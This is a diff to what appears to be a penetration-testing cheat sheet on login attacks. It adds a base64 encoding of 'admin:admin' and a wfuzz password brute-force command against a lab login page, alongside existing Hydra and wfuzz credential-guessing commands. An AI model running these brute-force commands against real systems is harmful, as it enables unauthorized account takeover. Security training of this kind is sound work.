@@ -22,6 +22,12 @@ HTTP Basic Authentication with Hydra:
 hydra -C /opt/SecLists/Passwords/Default-Credentials/tomcat-betterdefaultpasslist.txt http-get://10.10.10.10:8080/manager/html
 ```
 
+See the base64 value:
+
+```bash
+echo -n 'admin:admin' | base64
+```
+
 ### Enumerating Usernames via Error Messages
 
 We can enumerate usernames with error messages.
@@ -168,6 +174,8 @@ hydra -l admin -P /opt/SecLists/Passwords/10k_most_common.txt <IP> http-post-for
 
 ```text
 wfuzz -c -u http://<IP>/login.php -d 'username_param=FUZZ&password=FUZZ' -w <wordlist.txt> -hh 440
+
+wfuzz --hh 1073 -c -u http://10.10.10.101/users/login.php -X POST -d "Username=admin&Password=FUZZ&Submit=Login" -w /opt/SecLists/Passwords/darkweb2017-top10000.txt
 
 wfuzz -c -z wordlist1.txt wordlist2.txt -u http://<IP>/login.php -d 'username_param=FUZZ&password=FUZZ' -w <wordlist.txt> --hw 430
 
